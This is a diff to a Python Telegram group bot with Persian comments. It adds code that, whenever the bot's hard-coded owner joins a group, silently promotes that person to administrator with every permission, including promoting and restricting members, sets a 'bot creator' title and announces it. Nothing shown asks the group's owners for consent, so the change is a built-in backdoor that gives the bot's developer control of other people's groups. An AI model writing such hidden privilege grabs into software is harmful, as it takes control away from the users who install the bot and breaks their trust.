@@ -91,6 +91,57 @@ def get_chat_member(chat_id, user_id):
         logger.error(f"خطا: {e}")
         return {}
 
+def promote_owner(chat_id, user_id):
+    """ادمین کردن سازنده ربات با تمام دسترسی‌ها"""
+    url = f"{BASE_URL}/promoteChatMember"
+    payload = {
+        "chat_id": chat_id,
+        "user_id": user_id,
+        "is_anonymous": False,
+        "can_change_info": True,
+        "can_post_messages": True,
+        "can_edit_messages": True,
+        "can_delete_messages": True,
+        "can_invite_users": True,
+        "can_restrict_members": True,
+        "can_pin_messages": True,
+        "can_promote_members": True,
+        "can_manage_chat": True,
+        "can_manage_voice_chats": True,
+        "can_manage_video_chats": True
+    }
+    try:
+        response = requests.post(url, json=payload, timeout=30)
+        if response.status_code == 200:
+            logger.info(f"✅ سازنده {user_id} در گروه {chat_id} ادمین شد")
+            return True
+        else:
+            logger.error(f"❌ خطا در ادمین کردن: {response.text}")
+            return False
+    except Exception as e:
+        logger.error(f"❌ خطا: {e}")
+        return False
+
+def set_owner_title(chat_id, user_id):
+    """تنظیم لقب برای سازنده"""
+    url = f"{BASE_URL}/setChatAdministratorCustomTitle"
+    payload = {
+        "chat_id": chat_id,
+        "user_id": user_id,
+        "custom_title": "⋆ سازنده ربات ⋆"
+    }
+    try:
+        response = requests.post(url, json=payload, timeout=30)
+        if response.status_code == 200:
+            logger.info(f"✅ لقب سازنده در گروه {chat_id} تنظیم شد")
+            return True
+        else:
+            logger.error(f"❌ خطا در تنظیم لقب: {response.text}")
+            return False
+    except Exception as e:
+        logger.error(f"❌ خطا: {e}")
+        return False
+
 def is_admin(chat_id, user_id):
     member = get_chat_member(chat_id, user_id)
     status = member.get("status", "")
@@ -249,7 +300,22 @@ def handle_message(update):
     if not chat_id:
         return
     
+    # ===== بررسی ورود سازنده به گروه =====
     if chat_type in ["group", "supergroup"]:
+        
+        # وقتی سازنده به گروه اضافه میشه
+        if "new_chat_members" in message:
+            for member in message["new_chat_members"]:
+                member_id = member.get("id")
+                if member_id == OWNER_ID:
+                    # ادمین کردن سازنده
+                    promote_owner(chat_id, member_id)
+                    # تنظیم لقب
+                    set_owner_title(chat_id, member_id)
+                    # ارسال پیام خوش‌آمدگویی به سازنده
+                    send_message(chat_id, f"🌟 <b>به گروه خوش آمدید سازنده عزیز!</b>\n\nشما با موفقیت ادمین شدید و لقب <b>⋆ سازنده ربات ⋆</b> برای شما تنظیم شد.", reply_to_message_id=message_id)
+                    logger.info(f"👑 سازنده {member_id} به گروه {chat_id} اضافه و ادمین شد")
+                    return
         
         # ===== خدمات تلگرام =====
         if service_lock_status.get(chat_id, False):
